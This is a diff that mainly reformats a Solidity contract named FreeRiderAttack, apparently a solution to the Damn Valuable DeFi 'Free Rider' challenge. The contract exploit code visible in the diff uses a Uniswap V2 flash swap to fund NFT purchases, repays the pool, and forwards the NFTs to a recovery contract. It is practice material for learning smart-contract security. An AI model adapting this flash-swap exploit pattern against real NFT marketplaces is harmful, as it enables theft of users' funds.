@@ -9,21 +9,17 @@ import {DamnValuableNFT} from "../DamnValuableNFT.sol";
 interface WETH9 {
     function deposit() external payable;
 
-    function withdraw(uint wad) external;
+    function withdraw(uint256 wad) external;
 
-    function totalSupply() external view returns (uint);
+    function totalSupply() external view returns (uint256);
 
-    function approve(address guy, uint wad) external returns (bool);
+    function approve(address guy, uint256 wad) external returns (bool);
 
-    function transfer(address dst, uint wad) external returns (bool);
+    function transfer(address dst, uint256 wad) external returns (bool);
 
-    function transferFrom(
-        address src,
-        address dst,
-        uint wad
-    ) external returns (bool);
+    function transferFrom(address src, address dst, uint256 wad) external returns (bool);
 
-    function balanceOf(address guy) external view returns (uint);
+    function balanceOf(address guy) external view returns (uint256);
 }
 
 contract FreeRiderAttack {
@@ -55,12 +51,7 @@ contract FreeRiderAttack {
         dvNFT = DamnValuableNFT(_dvNFT);
     }
 
-    function uniswapV2Call(
-        address sender,
-        uint256 amount0Out,
-        uint256,
-        bytes calldata
-    ) external payable onlyPool {
+    function uniswapV2Call(address sender, uint256 amount0Out, uint256, bytes calldata) external payable onlyPool {
         require(sender == player, "Flash Swap can only be triggered by player");
 
         uint256 cost = 15 ether;
@@ -86,13 +77,8 @@ contract FreeRiderAttack {
 
         weth.transfer(address(uniswapPool), amount0Out + fee);
 
-        for (uint256 i = 0; i < tokenIds.length; ) {
-            dvNFT.safeTransferFrom(
-                address(this),
-                address(recoveryContract),
-                tokenIds[i],
-                abi.encode(player)
-            );
+        for (uint256 i = 0; i < tokenIds.length;) {
+            dvNFT.safeTransferFrom(address(this), address(recoveryContract), tokenIds[i], abi.encode(player));
             unchecked {
                 ++i;
             }
@@ -101,12 +87,7 @@ contract FreeRiderAttack {
 
     receive() external payable {}
 
-    function onERC721Received(
-        address,
-        address,
-        uint256,
-        bytes calldata
-    ) external pure returns (bytes4) {
+    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
         return this.onERC721Received.selector;
     }
 }
